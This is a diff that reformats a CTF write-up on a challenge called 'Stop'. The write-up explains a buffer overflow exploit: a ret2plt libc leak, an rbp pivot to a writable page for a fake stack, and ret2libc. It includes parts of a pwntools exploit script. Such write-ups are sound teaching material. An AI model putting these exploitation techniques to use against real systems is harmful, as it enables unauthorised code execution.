@@ -1,19 +1,18 @@
-Stop
+# Stop
 
 This has been explained in countless writeups, so I won't go over it largely, but there's NX and no PIE. 
-So we can use ret2plt, like always, to leak a libc address.
+So we can use ret2plt, like always, to leak a libc address.  
 
-LARGE PROBLEM! Main is quite a complex function. 
+### LARGE PROBLEM!  
+Main is quite a complex function. 
 For the purposes of buffer overflow, this is irrelevant to us.
 However, if we just overwrite RBP with a bunch of As,
-it means that errors will be caused at an instruction like mov DWORD PTR [rbp-0x8], 0x9 , 
+it means that errors will be caused at an instruction like `mov DWORD PTR [rbp-0x8], 0x9` , 
 and whenever pop is called(after rsp is set to rbp). 
 Thus, we must give rbp some form of authentic value so we can basically move the stack somewhere else. 
-There is a page mapped read and write inside of the binary at around 0x602000-0x603000 .
-We can set rbp to a value around here to create a nice fake stack, then execute a ret2libc attack.
-
-Script:
-
+There is a page mapped read and write inside of the binary at around `0x602000-0x603000` .
+We can set rbp to a value around here to create a nice fake stack, then execute a ret2libc attack.  
+```python
 from pwn import *
 NUM_TO_RET = 282
 padding = b'A' * NUM_TO_RET
@@ -40,3 +39,4 @@ payload = padding + chain
 pause()
 p.sendline(payload)
 p.interactive()
+```
